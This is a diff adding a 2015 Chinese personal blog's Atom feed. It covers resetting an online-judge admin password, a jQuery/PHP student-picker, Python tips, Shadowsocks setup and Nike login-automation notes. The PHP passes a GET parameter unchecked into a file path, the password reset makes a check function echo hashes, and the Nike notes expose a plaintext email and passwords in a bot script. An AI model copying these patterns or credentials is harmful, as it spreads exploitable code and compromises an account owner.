@@ -1,0 +1,827 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[Phoenix's nest]]></title>
+  
+  <link href="/atom.xml" rel="self"/>
+  <link href="http://kersujd.tk/"/>
+  <updated>2015-11-18T12:57:53.000Z</updated>
+  <id>http://kersujd.tk/</id>
+  
+  <author>
+    <name><![CDATA[Radish]]></name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[重置onlineJudge的密码]]></title>
+    <link href="http://kersujd.tk/2015/11/18/%E9%87%8D%E7%BD%AEonlineJudge%E7%9A%84%E5%AF%86%E7%A0%81/"/>
+    <id>http://kersujd.tk/2015/11/18/重置onlineJudge的密码/</id>
+    <published>2015-11-18T12:51:21.000Z</published>
+    <updated>2015-11-18T12:57:53.000Z</updated>
+    <content type="html"><![CDATA[<p>今天oj的备用服务器启用时，管理后台的密码找不到了，于是，我开始了一场长达三十分钟的重置密码之路。</p>
+<pre><code>mysql -u root -p jol
+<span class="keyword">select</span> * <span class="keyword">from</span> jol <span class="keyword">where</span> user_id=<span class="string">'admin'</span>
+</code></pre><p>查出密码是一串不知道什么鬼的字符串</p>
+<pre><code>Er4ucNhYsm+<span class="number">28</span>SQSNkS0a5mEqdZjMmMx
+</code></pre><p>进入login.php查看加密方式，一路追到include/my_function.php 的pwCheck函数：</p>
+<pre><code><span class="keyword">function</span> pwCheck(<span class="variable">$password</span>,<span class="variable">$saved</span>)
+{
+    if (isOldPW(<span class="variable">$saved</span>)){
+            <span class="variable">$mpw</span> = md5(<span class="variable">$password</span>);
+            if (<span class="variable">$mpw</span>==<span class="variable">$saved</span>) return True;
+            else return False;
+    }
+    <span class="variable">$svd</span>=base64_decode(<span class="variable">$saved</span>);
+    <span class="variable">$salt</span>=substr(<span class="variable">$svd</span>,<span class="number">20</span>);
+    <span class="variable">$hash</span> = base64_encode( sha1(md5(<span class="variable">$password</span>) . <span class="variable">$salt</span>, true) . <span class="variable">$salt</span> );
+    if (strcmp(<span class="variable">$hash</span>,<span class="variable">$saved</span>)==<span class="number">0</span>) return True;
+    else return False;
+}
+</code></pre><p>饶了半天绕晕了 直接改代码爆密码：</p>
+<pre><code><span class="keyword">function</span> pwCheck(<span class="variable">$password</span>,<span class="variable">$saved</span>)
+{
+    if (isOldPW(<span class="variable">$saved</span>)){
+            <span class="variable">$mpw</span> = md5(<span class="variable">$password</span>);
+            if (<span class="variable">$mpw</span>==<span class="variable">$saved</span>) return True;
+            else return False;
+    }
+    <span class="variable">$svd</span>=base64_decode(<span class="variable">$saved</span>);
+    <span class="variable">$salt</span>=substr(<span class="variable">$svd</span>,<span class="number">20</span>);
+    <span class="variable">$hash</span> = base64_encode( sha1(md5(<span class="variable">$password</span>) . <span class="variable">$salt</span>, true) . <span class="variable">$salt</span> );
+    if (strcmp(<span class="variable">$hash</span>,<span class="variable">$saved</span>)==<span class="number">0</span>) return True;
+    else
+    {
+            echo <span class="variable">$hash</span>;
+    }
+    //return False;
+}
+</code></pre><p>把得到的密码update成自己喜欢的 finfish~</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>今天oj的备用服务器启用时，管理后台的密码找不到了，于是，我开始了一场长达三十分钟的重置密码之路。</p>
+<pre><code>mysql -u root -p jol
+<span class="keyword">select</span> * <span class="]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[jquery+php ajax响应模型]]></title>
+    <link href="http://kersujd.tk/2015/11/18/jquery-php-ajax%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9E%8B/"/>
+    <id>http://kersujd.tk/2015/11/18/jquery-php-ajax响应模型/</id>
+    <published>2015-11-18T12:44:35.000Z</published>
+    <updated>2015-11-18T12:50:33.000Z</updated>
+    <content type="html"><![CDATA[<p>最近给学校里的oj平台设计了一个摇一摇（随机选择学号）的程序,同时也自己学习了一下mvc模式的具体实现。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">head</span>&gt;</span>
+    <span class="comment">&lt;!-- 新 Bootstrap 核心 CSS 文件 --&gt;</span>
+    <span class="tag">&lt;<span class="title">link</span> <span class="attribute">rel</span>=<span class="value">"stylesheet"</span> <span class="attribute">href</span>=<span class="value">"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"</span>&gt;</span>
+    <span class="comment">&lt;!-- 可选的Bootstrap主题文件（一般不用引入） --&gt;</span>
+    <span class="tag">&lt;<span class="title">link</span> <span class="attribute">rel</span>=<span class="value">"stylesheet"</span> <span class="attribute">href</span>=<span class="value">"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"</span>&gt;</span>
+    <span class="comment">&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;</span>
+    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+    <span class="comment">&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;</span>
+    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript">
+$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{
+ $(<span class="string">"#b01"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{
+  htmlobj=$.ajax({url:<span class="string">"/shake.php?num="</span>+$(<span class="string">"#num"</span>).val()+<span class="string">"&amp;class="</span>+$(<span class="string">"#class"</span>).val(),<span class="keyword">async</span>:<span class="literal">false</span>});
+
+  <span class="built_in">console</span>.log($(<span class="string">"#num"</span>).val());
+
+  <span class="keyword">var</span> obj = jQuery.parseJSON(htmlobj.responseText);
+  <span class="built_in">console</span>.log(obj[<span class="number">0</span>]);
+  $(<span class="string">"#myDiv"</span>).html(<span class="string">""</span>);
+  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;obj.length;i++)
+  {
+    <span class="built_in">console</span>.log(obj[i].name);
+    $(<span class="string">"#myDiv"</span>).append(<span class="string">"&lt;li class=\"list-group-item\"&gt;"</span>+obj[i].num+obj[i].name+<span class="string">"&lt;/li&gt;"</span>);
+  }
+  });
+});
+
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">head</span>&gt;</span>
+<span class="tag">&lt;<span class="title">nav</span> <span class="attribute">class</span>=<span class="value">"navbar navbar-inverse navbar-fixed-top"</span>&gt;</span>
+  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"container"</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"navbar-header"</span>&gt;</span>
+      <span class="tag">&lt;<span class="title">button</span> <span class="attribute">type</span>=<span class="value">"button"</span> <span class="attribute">class</span>=<span class="value">"navbar-toggle collapsed"</span> <span class="attribute">data-toggle</span>=<span class="value">"collapse"</span> <span class="attribute">data-target</span>=<span class="value">"#navbar"</span> <span class="attribute">aria-expanded</span>=<span class="value">"false"</span> <span class="attribute">aria-controls</span>=<span class="value">"navbar"</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">span</span> <span class="attribute">class</span>=<span class="value">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="title">span</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">span</span> <span class="attribute">class</span>=<span class="value">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="title">span</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">span</span> <span class="attribute">class</span>=<span class="value">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="title">span</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">span</span> <span class="attribute">class</span>=<span class="value">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="title">span</span>&gt;</span>
+      <span class="tag">&lt;/<span class="title">button</span>&gt;</span>
+      <span class="tag">&lt;<span class="title">a</span> <span class="attribute">class</span>=<span class="value">"navbar-brand"</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>Shake!<span class="tag">&lt;/<span class="title">a</span>&gt;</span>
+    <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"navbar"</span> <span class="attribute">class</span>=<span class="value">"navbar-collapse collapse"</span>&gt;</span>
+      <span class="tag">&lt;<span class="title">form</span> <span class="attribute">class</span>=<span class="value">"navbar-form navbar-right"</span> <span class="attribute">action</span>=<span class="value">"#"</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"form-group"</span>&gt;</span>
+          <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">placeholder</span>=<span class="value">"Number"</span> <span class="attribute">class</span>=<span class="value">"form-control"</span> <span class="attribute">id</span>=<span class="value">"num"</span>&gt;</span>
+        <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"form-group"</span>&gt;</span>
+          <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">placeholder</span>=<span class="value">"Class"</span> <span class="attribute">class</span>=<span class="value">"form-control"</span> <span class="attribute">value</span>=<span class="value">"31"</span> <span class="attribute">id</span>=<span class="value">"class"</span>&gt;</span>
+        <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
+        <span class="tag">&lt;<span class="title">button</span> <span class="attribute">class</span>=<span class="value">"btn btn-success"</span> <span class="attribute">id</span>=<span class="value">"b01"</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="title">button</span>&gt;</span>
+      <span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+    <span class="tag">&lt;/<span class="title">div</span>&gt;</span><span class="comment">&lt;!--/.navbar-collapse --&gt;</span>
+  <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">nav</span>&gt;</span>
+
+<span class="tag">&lt;<span class="title">body</span> <span class="attribute">style</span>=<span class="value">"padding: 10px;padding-top:55px;"</span>&gt;</span>
+
+
+<span class="tag">&lt;<span class="title">div</span> <span class="attribute">style</span>=<span class="value">"width:100%;float:left;"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">ul</span> <span class="attribute">class</span>=<span class="value">"list-group"</span> <span class="attribute">id</span>=<span class="value">"myDiv"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">ul</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
+
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>shake.php</p>
+<pre><code>&lt;?php
+include <span class="string">'./data.class.php'</span>;
+<span class="variable">$data</span> = new data();
+<span class="variable">$name</span> = <span class="variable">$data-</span>&gt;getData($_GET[<span class="string">'class'</span>]);//名字学号数据
+
+
+<span class="keyword">if</span>(isset($_GET[<span class="string">'num'</span>]))
+    <span class="variable">$num</span> = $_GET[<span class="string">'num'</span>];
+<span class="keyword">else</span> 
+    <span class="variable">$num</span> = <span class="number">1</span>; 
+<span class="keyword">if</span>((int)$_GET[<span class="string">'num'</span>] &gt; count(<span class="variable">$name</span>))
+    <span class="variable">$num</span> = <span class="number">1</span>;
+
+//echo <span class="variable">$num</span>;
+<span class="variable">$result</span> = array_rand(<span class="variable">$name</span> , (int)<span class="variable">$num</span>);
+//var_dump(<span class="variable">$result</span>);
+<span class="variable">$data-</span>&gt;display(<span class="variable">$result</span>,<span class="variable">$name</span>);
+?&gt;
+</code></pre><p>data.class.php</p>
+<pre><code>&lt;?php 
+class data
+{
+public function getData(<span class="variable">$name</span>)
+{
+    if(<span class="variable">$tmp</span> = parse_ini_file(<span class="string">"./$name.ini"</span>))
+        return <span class="variable">$tmp</span>;
+    else
+        return NULL;
+}
+public function display(<span class="variable">$arr</span>,<span class="variable">$name</span>)
+{
+    if(!is_array(<span class="variable">$arr</span>))
+    {
+        <span class="variable">$this-</span>&gt;display2(<span class="variable">$arr</span> , <span class="variable">$name</span>);
+        return ;
+    }
+    <span class="variable">$tmp</span> = [];
+    <span class="variable">$o</span> = <span class="number">0</span>;
+    foreach(<span class="variable">$arr</span> as <span class="variable">$k</span> =&gt; <span class="variable">$i</span>)
+    {
+        //echo <span class="variable">$i</span>;
+        <span class="variable">$tmp</span>[<span class="variable">$o</span>++] = [<span class="string">"num"</span> =&gt; <span class="variable">$i</span> ,<span class="string">"name"</span>=&gt; <span class="variable">$name</span>[<span class="variable">$i</span>] ];
+        //<span class="variable">$tmp</span>[<span class="variable">$i</span>] = <span class="variable">$name</span>[<span class="variable">$i</span>];
+    }
+    //var_dump(<span class="variable">$tmp</span>);
+    echo json_encode(<span class="variable">$tmp</span>);
+    //var_dump(json_decode(json_encode(<span class="variable">$tmp</span>)));
+}
+public function display2(<span class="variable">$int</span> = <span class="number">1</span>,<span class="variable">$name</span>)
+{
+    echo json_encode([[<span class="string">"num"</span> =&gt; <span class="variable">$int</span> , <span class="string">"name"</span> =&gt; <span class="variable">$name</span>[<span class="variable">$int</span>] ]]);
+}
+}
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>最近给学校里的oj平台设计了一个摇一摇（随机选择学号）的程序,同时也自己学习了一下mvc模式的具体实现。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<spa]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Python 学习笔记]]></title>
+    <link href="http://kersujd.tk/2015/11/12/Python-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>http://kersujd.tk/2015/11/12/Python-学习笔记/</id>
+    <published>2015-11-12T11:00:04.000Z</published>
+    <updated>2015-11-12T11:01:12.000Z</updated>
+    <content type="html"><![CDATA[<p>注意wb+++！！！！！！！</p>
+<p>python调用Shell脚本，有两种方法：os.system(cmd)或os.popen(cmd),前者返回值是脚本的退出状态码，后者的返回值是脚本执行过程中的输出内容。实际使用时视需求情况而选择。</p>
+<pre><code><span class="shebang">#!/usr/bin/env python3</span>
+</code></pre><p> 兼容性更强</p>
+<p>python memroy bomb</p>
+<pre><code><span class="number">2</span>**<span class="number">222222</span>
+</code></pre><p>进制转换</p>
+<pre><code>&gt;&gt;&gt; <span class="number">0x12</span>
+
+<span class="number">18</span>
+
+&gt;&gt;&gt; <span class="number">0</span>o12
+
+<span class="number">10</span>
+
+&gt;&gt;&gt; <span class="number">0</span>b1010100101
+
+<span class="number">677</span>
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>注意wb+++！！！！！！！</p>
+<p>python调用Shell脚本，有两种方法：os.system(cmd)或os.popen(cmd),前者返回值是脚本的退出状态码，后者的返回值是脚本执行过程中的输出内容。实际使用时视需求情况而选择。</p>
+<pre><code]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[用Shadowsocks找寄生兽看]]></title>
+    <link href="http://kersujd.tk/2015/11/08/%E7%94%A8Shadowsocks%E6%89%BE%E5%AF%84%E7%94%9F%E5%85%BD%E7%9C%8B/"/>
+    <id>http://kersujd.tk/2015/11/08/用Shadowsocks找寄生兽看/</id>
+    <published>2015-11-08T07:29:38.000Z</published>
+    <updated>2015-11-08T07:44:29.000Z</updated>
+    <content type="html"><![CDATA[<p>今天终于搞好了shadowsocks，可以用来看寄生兽啦（微笑）</p>
+<p>###setp1:<br>找一台vps，国外的，我用的是digital ocean，好用不贵。通过下面的链接充5$还送10$，足够三四个月用。<br>邀请链接：<br><a href="www.digitalocean.com/?refcode=de75753ad238">www.digitalocean.com/?refcode=de75753ad238</a></p>
+<p>###setp2:<br>找github上的shadowsocks链接：<br><a href="https://github.com/Ph0enixxx/shadowsocks/releases/tag/2.8.2" target="_blank" rel="external">https://github.com/Ph0enixxx/shadowsocks/releases/tag/2.8.2</a><br>来安装</p>
+<p>也可以通过 </p>
+<pre><code>pip <span class="keyword">install</span> shadowsocks
+</code></pre><p>来安装</p>
+<p>这里有一篇shadowsocks的介绍：<br><a href="./shadowsocks.md">shadowsocks</a></p>
+<p>###step3:<br>安装客户端：<br>    <a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-windows/releases</a></p>
+<p>在服务器上运行：</p>
+<pre><code>sudo ssserver -p <span class="number">443</span> -k password -m aes-<span class="number">256</span>-cfb --<span class="keyword">user</span> <span class="title">nobody</span> -d <span class="literal">start</span>
+</code></pre><p>就可以用客户端连接服务器的443端口了~<br><img src="./shadow.jpg" alt="shadowsocks"></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>今天终于搞好了shadowsocks，可以用来看寄生兽啦（微笑）</p>
+<p>###setp1:<br>找一台vps，国外的，我用的是digital ocean，好用不贵。通过下面的链接充5$还送10$，足够三四个月用。<br>邀请链接：<br><a href="www.]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Some Nike.com's message]]></title>
+    <link href="http://kersujd.tk/2015/11/08/Some-Nike-com-s-message/"/>
+    <id>http://kersujd.tk/2015/11/08/Some-Nike-com-s-message/</id>
+    <published>2015-11-08T07:16:04.000Z</published>
+    <updated>2015-11-08T07:16:17.000Z</updated>
+    <content type="html"><![CDATA[<p>获取号码的网址：<br><a href="http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=343738-018" target="_blank" rel="external">http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=343738-018</a><br>343938-017</p>
+<p>登陆:<br>{“idToState”:{“144644597124106489242725074291”:{“normalized”:true,”title”:””,”url”:”<a href="http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;hash&quot;:&quot;/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;data&quot;:{},&quot;id&quot;:&quot;144644597124106489242725074291&quot;,&quot;cleanUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;hashedUrl&quot;:&quot;/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;},&quot;144644627099506143441069871187&quot;:{&quot;normalized&quot;:true,&quot;title&quot;:&quot;&quot;,&quot;url&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;hash&quot;:&quot;/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;data&quot;:{},&quot;id&quot;:&quot;144644627099506143441069871187&quot;,&quot;cleanUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;hashedUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;}},&quot;urlToId&quot;:{&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;:&quot;144644597124106489242725074291&quot;,&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;:&quot;144644627099506143441069871187&quot;},&quot;stateToId&quot;:{&quot;{\&quot;data\&quot;:{},\&quot;title\&quot;:\&quot;\&quot;,\&quot;url\&quot;:\&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7\&quot;}&quot;:&quot;144644597124106489242725074291&quot;,&quot;{\&quot;data\&quot;:{},\&quot;title\&quot;:\&quot;\&quot;,\&quot;url\&quot;:\&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553\&quot;}&quot;:&quot;144644627099506143441069871187&quot;}}" target="_blank" rel="external">http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;hash&quot;:&quot;/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;data&quot;:{},&quot;id&quot;:&quot;144644597124106489242725074291&quot;,&quot;cleanUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;,&quot;hashedUrl&quot;:&quot;/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;},&quot;144644627099506143441069871187&quot;:{&quot;normalized&quot;:true,&quot;title&quot;:&quot;&quot;,&quot;url&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;hash&quot;:&quot;/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;data&quot;:{},&quot;id&quot;:&quot;144644627099506143441069871187&quot;,&quot;cleanUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;,&quot;hashedUrl&quot;:&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;}},&quot;urlToId&quot;:{&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7&quot;:&quot;144644597124106489242725074291&quot;,&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553&quot;:&quot;144644627099506143441069871187&quot;},&quot;stateToId&quot;:{&quot;{\&quot;data\&quot;:{},\&quot;title\&quot;:\&quot;\&quot;,\&quot;url\&quot;:\&quot;http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=http://store.nike.com/jp/ja_jp/pw/n/1j7\&quot;}&quot;:&quot;144644597124106489242725074291&quot;,&quot;{\&quot;data\&quot;:{},\&quot;title\&quot;:\&quot;\&quot;,\&quot;url\&quot;:\&quot;http://store.nike.com/jp/ja_jp/pd/%E3%83%8A%E3%82%A4%E3%82%AD-%E3%83%80%E3%82%A4%E3%83%8A%E3%83%A2-%E3%83%95%E3%83%AA%E3%83%BC-%E3%83%97%E3%83%AA%E3%82%B9%E3%82%AF%E3%83%BC%E3%83%AB%EF%BC%86%E3%82%AD%E3%83%83%E3%82%BA%E3%82%B7%E3%83%A5%E3%83%BC%E3%82%BA/pid-10346480/pgid-10349553\&quot;}&quot;:&quot;144644627099506143441069871187&quot;}}</a></p>
+<p>添加购物车：</p>
+<p>headless browser<br><a href="http://chuye.cloud7.com.cn/work/userworks" target="_blank" rel="external">http://chuye.cloud7.com.cn/work/userworks</a></p>
+<p>谷歌广告qq2898629332@gmail.com</p>
+<p><a href="http://wm.lrswl.com/affiliate/" target="_blank" rel="external">http://wm.lrswl.com/affiliate/</a></p>
+<p>$(“#gnav-bar–search-input”).attr(“value”,”12345”)<br>$(function()<br>{<br>        $(“.exp–geodetect-notifier–flag:last”).click();<br>         $(“.login-text”).click();<br>        $(“.login-form<strong>input:first”).attr(“value”,”754406613@qq.com”);<br>    $(“.login-form</strong>input:last”).attr(“value”,”754406613Shuai”);//这里的引号有问题！！！！！<br>        $(“.exp-login-submit”).click();<br>});</p>
+<p>‘document.write(\’&lt;script src=“<a href="https://code.jquery.com/jquery-2.1.4.min.js&quot;&gt;" target="_blank" rel="external">https://code.jquery.com/jquery-2.1.4.min.js&quot;&gt;</a>\’)’<br>‘$(“.login-text”).click();’<br>‘$(function(){$(“.exp–geodetect-notifier–flag:last”).click();$(“.login-text”).click();$(“.login-form<strong>input:first”).attr(“value”,”754406613@qq.com”);$(“.login-form</strong>input:last”).attr(“value”,”1234567shuai”);$(“.exp-login-submit”).click();});’</p>
+<p>page.settings.resourceTimeout = 5000;<br>page.open(‘<a href="http://www.nike.com/cn/zh_cn/‘,function(status" target="_blank" rel="external">http://www.nike.com/cn/zh_cn/‘,function(status</a>)<br>{<br>    $(“.exp–geodetect-notifier–flag:last”).click();<br>    $(“.login-text”).click();<br>    $(“.login-form<strong>input:first”).attr(“value”,”754406613@qq.com”);<br>    $(“.login-form</strong>input:last”).attr(“value”,”754406613Shuai”);//这里的引号有问题！！！！！<br>    $(“.exp-login-submit”).click();</p>
+<p>});</p>
+<p>你是我的ok绷</p>
+<p>var oDiv = document.getElementById(‘div’);   //获取元素div<br>oDiv.onclick = function(){   //给元素增加点击事件<br>    alert(1);<br>};<br>oDiv.click();  </p>
+<p><a href="http://segmentfault.com/a/1190000000619224" target="_blank" rel="external">http://segmentfault.com/a/1190000000619224</a></p>
